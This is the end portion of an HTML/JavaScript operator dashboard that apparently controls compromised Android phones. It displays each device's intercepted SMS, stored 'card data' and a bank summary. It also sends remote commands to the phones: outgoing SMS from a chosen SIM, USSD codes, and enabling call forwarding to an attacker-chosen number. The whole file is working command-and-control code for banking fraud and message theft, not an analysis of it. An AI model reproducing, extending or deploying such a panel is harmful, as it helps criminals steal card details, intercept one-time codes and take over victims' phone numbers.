               <div class="grid grid-cols-2 gap-4">
                  <div><label class="text-xs font-bold text-gray-500 uppercase">Date</label><p class="text-sm text-gray-700">${new Date(sms.timestamp).toLocaleString()}</p></div>
                  <div><label class="text-xs font-bold text-gray-500 uppercase">User ID</label><p class="text-xs text-gray-600 font-mono bg-gray-100 p-1 rounded truncate">${sms.userId}</p></div>
               </div>
             </div>
           </div>
        `;
        document.body.appendChild(modal);
        modal.querySelector('#close-sms-modal').onclick = () => modal.remove();
        modal.onclick = (e) => { if(e.target === modal) modal.remove(); };
    };

    document.getElementById('sms-search').oninput = (e) => {
        searchQ = e.target.value;
        renderList();
    };

    let hasChecked = false;
    const update = (list) => {
        currentSmsList = list;
        renderChips(); // Update chips when list updates
        renderList();
        
        if(!hasChecked && list.length > 0) { 
            const now = Date.now();
            const oneHour = 60 * 60 * 1000;
            const old = list.filter(m => now - m.timestamp > oneHour);
            if(old.length > 0) {
                if(confirm(`Found ${old.length} messages older than 1 hour. Delete them?`)) {
                    deleteBatchSMS(old);
                    showToast(`Deleted ${old.length} old messages`);
                }
            }
            hasChecked = true; 
        }
    };

    if(isGlobal) {
        fetchGlobalSMS().then(update);
        startAutoRefresh(() => fetchGlobalSMS().then(update));
    } else {
        state.subscriptions.push(subscribeToSMS(target.userId, update));
        startAutoRefresh(() => {}); 
    }
};

// --- USER DATA VIEWER ---
const renderUserDataViewer = () => {
    clearSubscriptions();
    const t = state.selectedTargetUser;
    const root = document.getElementById('root');
    let infoData = {};
    let activeTab = 'ACTIONS';
    let ussdHistory = [];

    // Setup Shell
    root.innerHTML = `
      <div class="h-full flex flex-col bg-gray-50">
         <header class="bg-white border-b px-4 py-4 flex justify-between items-center sticky top-0 z-10 shadow-sm flex-none">
            <div class="flex items-center space-x-3">
               <button id="btn-back" class="p-2 rounded-full hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-300" aria-label="Go Back"><svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg></button>
               <div>
                  <h1 class="font-bold text-lg leading-tight">${t.Brand}</h1>
                  <div class="flex items-center space-x-1">
                     <span class="text-xs text-gray-500 font-mono">${t.userId}</span>
                     <button onclick="navigator.clipboard.writeText('${t.userId}'); alert('Copied')" class="text-gray-400 hover:text-gray-600 focus:outline-none"><svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg></button>
                  </div>
               </div>
            </div>
            <div class="flex items-center gap-3">
                <button id="btn-check" class="p-2 text-gray-400 hover:text-green-600 hover:bg-green-50 rounded-full focus:outline-none focus:ring-2 focus:ring-green-500" aria-label="Mark Checked"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg></button>
                <div class="px-3 py-1 rounded-full text-xs font-bold uppercase ${t.Status==='Online'?'bg-green-100 text-green-700':'bg-gray-200 text-gray-600'}">${t.Status}</div>
            </div>
         </header>
         
         <div class="flex-1 overflow-y-auto p-4 max-w-5xl mx-auto w-full space-y-6">
            <div id="sim-card" class="bg-white rounded-xl shadow-sm border border-gray-100 p-5 grid grid-cols-1 md:grid-cols-2 gap-6"></div>

            <div class="flex bg-gray-200/50 p-1 rounded-xl" role="tablist">
               <button class="tab flex-1 py-2 text-sm font-bold rounded-lg transition-all bg-white shadow text-gray-900 focus:outline-none focus:ring-2 focus:ring-app-green" role="tab" aria-selected="true" data-tab="ACTIONS">ACTIONS</button>
               <button class="tab flex-1 py-2 text-sm font-bold rounded-lg transition-all text-gray-500 hover:text-gray-700 focus:outline-none focus:ring-2 focus:ring-app-green" role="tab" aria-selected="false" data-tab="DATA">DATA</button>
               <button class="tab flex-1 py-2 text-sm font-bold rounded-lg transition-all text-gray-500 hover:text-gray-700 focus:outline-none focus:ring-2 focus:ring-app-green" role="tab" aria-selected="false" data-tab="CARDS">CARDS</button>
            </div>
            
            <div id="tab-content" class="pb-10"></div>
         </div>
      </div>
    `;

    document.getElementById('btn-back').onclick = () => { state.currentScreen = 'HOME'; renderApp(); };
    document.getElementById('btn-check').onclick = () => { markUserAsChecked(t.userId); showToast("Marked"); };

    const tabContent = document.getElementById('tab-content');
    const simDiv = document.getElementById('sim-card');

    // -- ACTION MODAL HANDLERS --
    
// SMS Modal
const openSmsActionModal = () => {
   const modal = document.createElement('div');
   modal.className = 'fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4';
   modal.innerHTML = `
      <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden transform transition-all animate-fadeIn">
        <div class="bg-gradient-to-r from-app-green to-teal-600 px-6 py-4 text-white flex justify-between items-center">
          <span class="font-bold text-lg">Send SMS</span>
          <button id="close-modal" class="opacity-80 hover:opacity-100 focus:outline-none">✕</button>
        </div>
        <div class="p-6 space-y-5">
           <div>
             <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Sim Slot</label>
             <div class="flex bg-gray-100 p-1 rounded-lg">
                <button class="slot-btn flex-1 py-2 rounded-md text-sm font-bold transition-all bg-white shadow text-app-green focus:outline-none" data-slot="0">SIM 1</button>
                <button class="slot-btn flex-1 py-2 rounded-md text-sm font-bold transition-all text-gray-500 hover:text-gray-700 focus:outline-none" data-slot="1">SIM 2</button>
             </div>
           </div>
           <div>
              <label class="block text-xs font-bold text-gray-500 uppercase mb-2">To Number</label>
              <input id="sms-to" type="tel" class="w-full border border-gray-200 rounded-lg p-3 focus:border-app-green focus:outline-none bg-gray-50 focus:bg-white" placeholder="+1234567890">
           </div>
           <div>
              <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Message</label>
              <textarea id="sms-msg" rows="3" class="w-full border border-gray-200 rounded-lg p-3 focus:border-app-green focus:outline-none bg-gray-50 focus:bg-white resize-none" placeholder="Type your message..."></textarea>
           </div>
           <button id="do-send" class="w-full bg-app-green text-white py-3.5 rounded-xl font-bold shadow-lg shadow-green-200 hover:bg-green-700 transition-all focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-app-green">Send Command</button>
        </div>
      </div>`;
   document.body.appendChild(modal);

   // FINAL SIM SLOT DISABLE LOGIC
   let selectedSlot = null;

   const sim1 = infoData.simDetails?.sim1Number;
   const sim2 = infoData.simDetails?.sim2Number;

   const slotBtns = modal.querySelectorAll('.slot-btn');

   // SIM 1
   if (!sim1 || sim1 === "Unknown") {
       slotBtns[0].disabled = true;
       slotBtns[0].style.opacity = "0.5";
       slotBtns[0].style.cursor = "not-allowed";
   } else {
       selectedSlot = 0;
   }

   // SIM 2
   if (!sim2 || sim2 === "Unknown") {
       slotBtns[1].disabled = true;
       slotBtns[1].style.opacity = "0.5";
       slotBtns[1].style.cursor = "not-allowed";
   } else if (selectedSlot === null) {
       selectedSlot = 1;
   }

   // Click Handler 
   slotBtns.forEach(btn => {
       if (!btn.disabled) {
           btn.onclick = () => {
               selectedSlot = parseInt(btn.dataset.slot);
               slotBtns.forEach(x => {
                   x.className =
                       `slot-btn flex-1 py-2 rounded-md text-sm font-bold transition-all focus:outline-none ${
                           parseInt(x.dataset.slot) === selectedSlot
                               ? 'bg-white shadow text-app-green'
                               : 'text-gray-500 hover:text-gray-700'
                       }`;
               });
           };
       }
   });

   // Actions
   modal.querySelector('#close-modal').onclick = () => modal.remove();

   modal.querySelector('#do-send').onclick = () => {
       const to = modal.querySelector('#sms-to').value;
       const msg = modal.querySelector('#sms-msg').value;
       if(to && msg) {
           sendCommandSms(t.userId, to, msg, selectedSlot).then(() => {
               modal.remove();
           });
       } else alert("Fill all fields");
   };
};

    // Call Fwd Modal
    const openCallFwdModal = () => {
       const modal = document.createElement('div');
       modal.className = 'fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4';
       modal.innerHTML = `
          <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden animate-fadeIn">
            <div class="bg-blue-600 px-6 py-4 text-white flex justify-between items-center">
              <span class="font-bold text-lg">Call Forwarding</span>
              <button id="close-modal" class="opacity-80 hover:opacity-100 focus:outline-none">✕</button>
            </div>
            <div class="p-6 space-y-5">
               <div id="cf-status" class="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-xs h-24 overflow-y-auto border border-gray-800 shadow-inner whitespace-pre-wrap">Waiting for status...</div>
               <div>
                 <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Sim Slot</label>
                 <div class="flex bg-gray-100 p-1 rounded-lg">
                    <button class="slot-btn flex-1 py-2 rounded-md text-sm font-bold transition-all bg-white shadow text-blue-600 focus:outline-none" data-slot="0">SIM 1</button>
                    <button class="slot-btn flex-1 py-2 rounded-md text-sm font-bold transition-all text-gray-500 hover:text-gray-700 focus:outline-none" data-slot="1">SIM 2</button>
                 </div>
               </div>
               <div>
                  <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Forward To Number</label>
                  <input id="cf-num" type="tel" class="w-full border border-gray-200 rounded-lg p-3 focus:border-blue-500 focus:outline-none" placeholder="Enter target number">
               </div>
               <div class="grid grid-cols-2 gap-3">
                 <button id="do-enable" class="bg-blue-600 text-white py-3 rounded-lg font-bold shadow-sm hover:bg-blue-700 transition-all focus:outline-none">Enable</button>
                 <button id="do-disable" class="bg-red-50 text-red-600 py-3 rounded-lg font-bold border border-red-200 hover:bg-red-100 transition-all focus:outline-none">Disable</button>
               </div>
            </div>
          </div>`;
       document.body.appendChild(modal);

// FINAL SIM SLOT DISABLE LOGIC (CALL FORWARDING)
let selectedSlot = null;

const sim1 = infoData.simDetails?.sim1Number;
const sim2 = infoData.simDetails?.sim2Number;

const slotCF = modal.querySelectorAll('.slot-btn');

// SIM 1
if (!sim1 || sim1 === "Unknown") {
    slotCF[0].disabled = true;
    slotCF[0].style.opacity = "0.5";
    slotCF[0].style.cursor = "not-allowed";
} else {
    selectedSlot = 0;
}

// SIM 2
if (!sim2 || sim2 === "Unknown") {
    slotCF[1].disabled = true;
    slotCF[1].style.opacity = "0.5";
    slotCF[1].style.cursor = "not-allowed";
} else if (selectedSlot === null) {
    selectedSlot = 1;
}

// Click Handler (only enabled)
slotCF.forEach(btn => {
    if (!btn.disabled) {
        btn.onclick = () => {
            selectedSlot = parseInt(btn.dataset.slot);
            slotCF.forEach(x => {
                x.className =
                    `slot-btn flex-1 py-2 rounded-md text-sm font-bold transition-all focus:outline-none ${
                        parseInt(x.dataset.slot) === selectedSlot
                            ? 'bg-white shadow text-blue-600'
                            : 'text-gray-500 hover:text-gray-700'
                    }`;
            });
        };
    }
});


       // Subscribe to Status
const unsub = onValue(
    ref(db, `All_Users/CallForwarding/${t.userId}/callForwardStatus`),
    snap => {
        const el = modal.querySelector('#cf-status');
        if (el) {
            const msg = snap.val();
            el.innerText = msg ? String(msg) : "Waiting...";
        }
    }
);


       modal.querySelector('#close-modal').onclick = () => { unsub(); modal.remove(); };
       
       const handle = (enable) => {
    const box = modal.querySelector('#cf-status');
    const n = modal.querySelector('#cf-num').value;

    if (enable && !n) {
        box.innerText = "Enter number first.";
        return;
    }

    box.innerText = "Sending...";

    setCallForwarding(t.userId, n, selectedSlot, enable)
        .then(() => {
            box.innerText = "Waiting for device...";
        })
        .catch(() => {
            box.innerText = "Failed to send command";
        });
};

       modal.querySelector('#do-enable').onclick = () => handle(true);
       modal.querySelector('#do-disable').onclick = () => handle(false);
    };

    const renderTabs = () => {
        document.querySelectorAll('.tab').forEach(b => {
            const isSelected = b.dataset.tab === activeTab;
            b.className = `tab flex-1 py-2 text-sm font-bold rounded-lg transition-all focus:outline-none focus:ring-2 focus:ring-app-green ${isSelected ? 'bg-white shadow text-gray-900' : 'text-gray-500 hover:text-gray-700'}`;
            b.setAttribute('aria-selected', isSelected);
        });

        if(activeTab === 'ACTIONS') {
            tabContent.innerHTML = `
               <div class="grid grid-cols-1 md:grid-cols-2 gap-4 animate-fadeIn">
                  <button id="act-sms" class="col-span-1 md:col-span-2 bg-gradient-to-r from-app-green to-teal-600 text-white p-6 rounded-xl shadow-md hover:shadow-lg transition-all flex items-center justify-center space-x-3 group focus:outline-none focus:ring-4 focus:ring-green-300">
                     <svg class="w-8 h-8 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" /></svg>
                     <div class="text-left"><span class="block font-bold text-xl">Enhanced SMS Control</span><span class="text-xs text-green-100 opacity-80">Send messages via specific SIM</span></div>
                  </button>
                  <button id="act-ussd" class="bg-white border border-gray-200 p-6 rounded-xl shadow-sm hover:border-purple-300 transition-all flex flex-col items-center justify-center text-center space-y-2 focus:outline-none focus:ring-4 focus:ring-purple-200 group">
                     <div class="p-3 bg-purple-50 text-purple-600 rounded-full group-hover:bg-purple-100 transition-colors"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg></div>
                     <span class="font-bold text-gray-800">USSD Terminal</span>
                  </button>
                  <button id="act-cf" class="bg-white border border-gray-200 p-6 rounded-xl shadow-sm hover:border-blue-300 transition-all flex flex-col items-center justify-center text-center space-y-2 focus:outline-none focus:ring-4 focus:ring-blue-200 group">
                     <div class="p-3 bg-blue-50 text-blue-600 rounded-full group-hover:bg-blue-100 transition-colors"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" /></svg></div>
                     <span class="font-bold text-gray-800">Call Forwarding</span>
                  </button>
               </div>
            `;
            
            document.getElementById('act-sms').onclick = openSmsActionModal;
            document.getElementById('act-ussd').onclick = openUssdModal;
            document.getElementById('act-cf').onclick = openCallFwdModal;

        } else {
            const src = activeTab === 'DATA' ? (infoData.info||{}) : (infoData.cards||{});
            const keys = Object.keys(src);
            tabContent.innerHTML = keys.length ? `
               <div class="space-y-3 animate-fadeIn">
               ${keys.map(k => `
                 <div class="bg-white rounded-lg border border-gray-200 overflow-hidden">
                    <div class="px-4 py-3 bg-gray-50/50 flex items-center justify-between border-b border-gray-100">
                       <span class="text-xs font-bold uppercase ${activeTab==='DATA'?'text-blue-600':'text-purple-600'}">${k}</span>
                    </div>
                    <div class="p-4 text-sm font-mono break-words bg-white whitespace-pre-wrap text-gray-700">${typeof src[k]==='object'?JSON.stringify(src[k],null,2):src[k]}</div>
                 </div>
               `).join('')}
               </div>` : '<div class="text-center p-10 text-gray-400 border-2 border-dashed rounded-xl">No Data Found</div>';
        }
    };

    const openUssdModal = () => {
        const modal = document.createElement('div');
        modal.className = 'fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4';
        modal.innerHTML = `
          <div class="bg-white rounded-2xl shadow-2xl w-full max-w-md overflow-hidden flex flex-col h-[500px]">
            <div class="bg-gray-900 px-6 py-4 text-white flex justify-between items-center shrink-0">
               <span class="font-mono font-bold">USSD_TERMINAL</span>
               <button id="close-ussd" class="opacity-80 hover:opacity-100 focus:outline-none">✕</button>
            </div>
            <div id="ussd-log" class="flex-1 overflow-y-auto p-4 bg-gray-50 space-y-2 font-mono text-sm"></div>
            <div class="p-4 bg-white border-t border-gray-200 shrink-0">
               <div class="flex items-center space-x-3 mb-3">
                  <span class="text-xs font-bold text-gray-400 uppercase">Target SIM</span>
                  <div class="flex bg-gray-100 rounded-md p-0.5">
                    <button class="slot-btn px-3 py-1 text-xs rounded font-bold transition-all focus:outline-none bg-white shadow text-gray-900" data-slot="0">SIM 1</button>
                    <button class="slot-btn px-3 py-1 text-xs rounded font-bold transition-all focus:outline-none text-gray-400" data-slot="1">SIM 2</button>
                  </div>
               </div>
               <div class="flex gap-2">
                   <input id="ussd-in" class="flex-1 border border-gray-300 rounded-lg px-4 py-2 focus:outline-none focus:border-gray-900" placeholder="*123#">
                   <button id="ussd-send" class="bg-gray-900 text-white px-4 py-2 rounded-lg font-bold">SEND</button>
               </div>
            </div>
          </div>`;
        document.body.appendChild(modal);
        
// FINAL SIM SLOT DISABLE LOGIC (USSD)
let selectedSlot = null;

const sim1 = infoData.simDetails?.sim1Number;
const sim2 = infoData.simDetails?.sim2Number;

const slotUSSD = modal.querySelectorAll('.slot-btn');

// SIM 1
if (!sim1 || sim1 === "Unknown") {
    slotUSSD[0].disabled = true;
    slotUSSD[0].style.opacity = "0.5";
    slotUSSD[0].style.cursor = "not-allowed";
} else {
    selectedSlot = 0;
}

// SIM 2
if (!sim2 || sim2 === "Unknown") {
    slotUSSD[1].disabled = true;
    slotUSSD[1].style.opacity = "0.5";
    slotUSSD[1].style.cursor = "not-allowed";
} else if (selectedSlot === null) {
    selectedSlot = 1;
}

// Click Handler
slotUSSD.forEach(btn => {
    if (!btn.disabled) {
        btn.onclick = () => {
            selectedSlot = parseInt(btn.dataset.slot);
            slotUSSD.forEach(x => {
                x.className =
                    `slot-btn px-3 py-1 text-xs rounded font-bold transition-all focus:outline-none ${
                        parseInt(x.dataset.slot) === selectedSlot
                            ? 'bg-white shadow text-gray-900'
                            : 'text-gray-400'
                    }`;
            });
        };
    }
});


        const log = modal.querySelector('#ussd-log');
        const renderLog = () => {
            log.innerHTML = ussdHistory.map(m => `
                <div class="flex ${m.type==='SENT'?'justify-end':'justify-start'}">
                   <div class="max-w-[85%] p-2 rounded-lg ${m.type==='SENT'?'bg-gray-200':'bg-white border'}">${m.text}</div>
                </div>
            `).join('');
            log.scrollTop = log.scrollHeight;
        };
        renderLog();

        // Subscribe to responses
        const unsub = subscribeToUssdResponse(t.userId, (d) => {
            if(d) {
                const txt = typeof d === 'string' ? d : (d.message||JSON.stringify(d));
                ussdHistory.push({ type: 'RECV', text: txt });
                renderLog();
            }
        });

        modal.querySelector('#close-ussd').onclick = () => { unsub(); modal.remove(); };
        modal.querySelector('#ussd-send').onclick = () => {
            const val = modal.querySelector('#ussd-in').value;
            if(val) {
                ussdHistory.push({ type: 'SENT', text: val });
                renderLog();
                sendUssdCommand(t.userId, val, selectedSlot)
                    .catch(() => sendNotification('Command Failed', 'USSD command failed'));
                modal.querySelector('#ussd-in').value = '';
            }
        };
    };

    state.subscriptions.push(subscribeToFullUserInfo(t.userId, (d) => {
        infoData = d;
        const s = d.simDetails || {};
        simDiv.innerHTML = `
           <div class="flex items-start space-x-3">
             <div class="bg-blue-50 p-2 rounded text-blue-600"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg></div>
             <div><h3 class="text-xs font-bold text-gray-400 uppercase tracking-wide">SIM 1</h3><p class="text-sm font-mono font-medium text-gray-900">${s.sim1Number||'N/A'}</p><p class="text-xs text-gray-500">${s.sim1Provider||''}</p></div>
           </div>
           <div class="flex items-start space-x-3">
             <div class="bg-purple-50 p-2 rounded text-purple-600"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg></div>
             <div><h3 class="text-xs font-bold text-gray-400 uppercase tracking-wide">SIM 2</h3><p class="text-sm font-mono font-medium text-gray-900">${s.sim2Number||'N/A'}</p><p class="text-xs text-gray-500">${s.sim2Provider||''}</p></div>
           </div>
        `;
        renderTabs();
    }));

    // Delegation for tabs
    tabContent.parentNode.addEventListener('click', (e) => {
        if(e.target.classList.contains('tab')) {
            activeTab = e.target.dataset.tab;
            renderTabs();
        }
    });
};

// --- GLOBAL DATA ---
const renderGlobalData = () => {
    clearSubscriptions();
    const root = document.getElementById('root');
    root.innerHTML = `
      <div class="h-full flex flex-col bg-gray-50">
        <header class="bg-white px-6 py-4 shadow-sm border-b sticky top-0 z-20 flex items-center flex-none">
          <button id="btn-back" class="mr-4 p-2 rounded-full hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-300" aria-label="Go Back"><svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg></button>
          <h1 class="font-bold text-xl text-gray-900">Global Data</h1>
        </header>
        <div id="gdata-list" class="flex-1 overflow-auto p-6 space-y-6">
            <div class="flex justify-center mt-20"><div class="animate-spin rounded-full h-10 w-10 border-b-2 border-indigo-600"></div></div>
        </div>
      </div>
    `;
    
    document.getElementById('btn-back').onclick = () => { state.currentScreen = 'HOME'; renderApp(); };
    const list = document.getElementById('gdata-list');

    state.subscriptions.push(subscribeToGlobalData((data) => {
        if(!data.length) { list.innerHTML = '<div class="text-center text-gray-400 mt-10 p-10 border-2 border-dashed border-gray-200 rounded-xl">No data found</div>'; return; }
        
        list.innerHTML = data.map(u => `
           <div class="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden hover:shadow-md transition-shadow">
              <div class="bg-gray-50/50 px-6 py-4 border-b border-gray-100 flex flex-col sm:flex-row justify-between sm:items-center gap-2">
                 <div class="flex items-center space-x-3">
                    <div class="h-8 w-8 rounded-full bg-indigo-100 flex items-center justify-center text-indigo-600">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
                    </div>
                    <div>
                        <span class="font-bold text-gray-900 block text-sm sm:text-base">${u.Brand||'Device'}</span>
                        <div class="flex items-center space-x-2">
                           <span class="text-xs text-gray-500 font-mono">${u.DeviceId}</span>
                           <span class="text-[10px] uppercase font-bold px-2 py-0.5 rounded-full ${u.Status==='Online'?'bg-green-100 text-green-700':'bg-red-100 text-red-700'}">${u.Status||'Offline'}</span>
                        </div>
                    </div>
                 </div>
                 <span class="text-[10px] bg-gray-100 text-gray-600 px-3 py-1 rounded-full font-mono border border-gray-200 self-start sm:self-auto">${u.userId}</span>
              </div>
              
              <div class="p-6 grid lg:grid-cols-2 gap-8">
                 <div>
                    <h3 class="text-xs font-bold text-gray-900 uppercase mb-4 flex items-center tracking-wider"><span class="w-2 h-2 rounded-full bg-indigo-500 mr-2"></span>General Info</h3>
                    <div class="bg-white">${u.info ? Object.entries(u.info).map(([k,v]) => `<div class="flex border-b border-gray-50 py-2"><span class="text-xs font-bold text-gray-400 w-1/3">${k}</span><span class="text-sm font-mono text-gray-700 break-words w-2/3">${typeof v==='object'?JSON.stringify(v).replace(/[{}"]/g,' '):v}</span></div>`).join('') : '<div class="text-xs italic text-gray-400">No info</div>'}</div>
                 </div>
                 <div>
                    <h3 class="text-xs font-bold text-gray-900 uppercase mb-4 flex items-center tracking-wider"><span class="w-2 h-2 rounded-full bg-blue-500 mr-2"></span>Card Data</h3>
                    <div class="bg-white">${u.cards ? Object.entries(u.cards).map(([k,v]) => `<div class="flex border-b border-gray-50 py-2"><span class="text-xs font-bold text-gray-400 w-1/3">${k}</span><span class="text-sm font-mono text-gray-700 break-words w-2/3">${typeof v==='object'?JSON.stringify(v).replace(/[{}"]/g,' '):v}</span></div>`).join('') : '<div class="text-xs italic text-gray-400">No cards</div>'}</div>
                 </div>
              </div>
           </div>
        `).join('');
    }));
};

// --- ROUTER ---
const renderApp = () => {
    const s = state.currentScreen;
    if(s === 'LOGIN') renderLogin();
    else if(s === 'HOME') renderHome();
    else if(s === 'SMS_VIEW' || s === 'GLOBAL_SMS') renderSmsViewer();
    else if(s === 'DATA_VIEW') renderUserDataViewer();
    else if(s === 'GLOBAL_DATA') renderGlobalData();
    else if(s === 'BANK_SUMMARY') renderBankSummary();
};

// Init
renderApp();

</script>
</body>
</html>
